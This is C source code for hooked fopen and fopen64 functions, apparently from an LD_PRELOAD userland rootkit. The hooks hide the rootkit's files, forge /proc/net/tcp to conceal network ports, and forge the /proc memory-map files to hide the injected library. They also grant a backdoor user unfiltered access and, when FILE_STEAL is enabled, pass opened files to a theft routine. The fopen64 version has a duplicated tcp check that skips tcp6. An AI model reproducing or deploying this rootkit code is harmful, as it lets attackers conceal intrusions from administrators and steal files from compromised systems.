FILE *fopen(const char *pathname, const char *mode){
    hook(CFOPEN);
    if(is_bdusr()) return call(CFOPEN, pathname, mode);

    if(hidden_path(pathname)){
        errno = ENOENT;
        return NULL;
    }

#ifdef HIDE_PORTS
    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
        return forge_procnet(pathname);
#endif

#ifdef FORGE_MAPS
    if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
    if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
    if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);

    char cwd[PROCPATH_MAXLEN];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }
    }
#endif

#ifdef FILE_STEAL
    inspect_file(pathname);
#endif
    return call(CFOPEN, pathname, mode);
}

FILE *fopen64(const char *pathname, const char *mode){
    hook(CFOPEN64);
    if(is_bdusr()) return call(CFOPEN64, pathname, mode);
    if(hidden_path(pathname)){
        errno = ENOENT;
        return NULL;
    }

#ifdef HIDE_PORTS
    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp"))
        return forge_procnet(pathname);
#endif

#ifdef FORGE_MAPS
    if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
    if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
    if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);

    char cwd[PROCPATH_MAXLEN];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }
    }
#endif

#ifdef FILE_STEAL
    inspect_file(pathname);
#endif
    return call(CFOPEN64, pathname, mode);
}
